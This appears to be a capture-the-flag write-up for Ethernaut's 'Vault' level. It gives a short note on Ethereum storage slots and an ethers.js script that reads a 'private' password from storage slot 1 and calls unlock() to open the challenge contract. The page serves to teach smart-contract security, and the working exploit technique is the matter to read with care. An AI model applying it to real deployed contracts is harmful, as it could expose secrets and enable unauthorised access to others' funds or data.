---
description: In Ethernaut's Vault, we look at how "private" on-chain data really is.
---

# 8 - Vault

### Notes

Variables are stored in "slots" - often slot index position starting from 0, by variable, but Ethereum tries to make storage as efficient as possible and may mix this up.&#x20;

### Scripted Solution

```javascript
const fs = require('fs')
const ethers = require('ethers')
require('dotenv').config({ path: './.env' })

/**
 * Initialize Ethers objects needed to interact with the blockchain and
 * contract.
 */
async function setup(contractName) {
  // Create provider - a read-only abstraction to access blockchain data
  const provider = new ethers.providers.InfuraProvider(process.env.NETWORK)
  // Create player wallet
  const playerWallet = new ethers.Wallet(process.env.PRIVATE_KEY)
  // Create player wallet signer - an abstraction of an Ethereum account
  const playerWalletSigner = await playerWallet.connect(provider)
  // Create contract instance - an abstraction of the deployed contract code
  const contractAbi = fs.readFileSync(`./${contractName}.abi`, 'utf8')
  const contract = new ethers.Contract(
    process.env.CONTRACT_ADDRESS,
    contractAbi,
    playerWalletSigner
  )

  return { provider, playerWallet, playerWalletSigner, contract }
}

/**
 * Run contract exploit.
 */
async function main() {
  // Get Ethers objects needed to interact with the blockchain and contract
  const { provider, contract: vaultContract } = await setup('Vault')

  // Get contract `locked` variable
  console.log(`Contract locked: ${await vaultContract.locked()}.`)

  // Get `password` from contract storage slot
  console.log('Getting password from contract storage...')
  const passwordSlot = 1
  const password = await provider.getStorageAt(
    vaultContract.address,
    passwordSlot
  )
  console.log(
    `Password to utf-8 string: ${ethers.utils.toUtf8String(password)}`
  )

  // Unlock vault by calling `unlock` with password
  console.log('Unlocking vault with password...')
  const vaultUnlock = await vaultContract.unlock(password)
  vaultUnlock.wait(1)

  // Confirm vault is unlocked
  console.log(`Contract locked: ${await vaultContract.locked()}.`)
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error)
    process.exit(1)
  })
```
